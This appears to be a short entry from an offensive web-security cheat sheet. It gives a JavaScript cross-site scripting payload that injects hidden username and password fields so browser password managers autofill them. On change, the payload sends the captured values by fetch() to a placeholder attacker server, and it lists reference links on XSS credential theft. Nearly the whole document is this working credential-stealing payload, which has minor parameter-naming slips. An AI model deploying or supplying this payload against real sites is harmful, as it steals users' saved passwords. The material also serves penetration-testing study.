# Harvest Autofill Credentials

```js
let body = document.querySelector('body');

// Fetch the credentials from input attributes
let username = document.createElement('input');
username.type = "text";
username.name = "username";
username.style.position = "fixed";

let password = document.createElement('input');
password.type = "password";
password.name = "password";
password.style.position = "fixed";

// Append element attributes
body.append(username);
body.append(password);

// Track values with event handlers
username.addEventListener('change', sendUsername);
password.addEventListener('change', sendPassword);

// Sending credentials to the attacker's server
function sendUsername() {
	fetch(`http[s]://<IP>/creds?=username=${username.value}`);
}

function sendPassword() {
	fetch(`http[s]://<IP>/creds?=username=${password.value}`);
}
```

---
## References

- [IMVK: Cross Site Scripting – Exploitation ](https://imvk.net/en/infosec/ethical-web-hacking/cross-site-scripting-exploitation)

- [ancat: Stealing From Password Managers with XSS](https://ancat.github.io/xss/2017/01/08/stealing-plaintext-passwords.html)

- [XSS-Autofil](https://github.com/davidgilbertson/xss-autofil/blob/master/public/xss.js)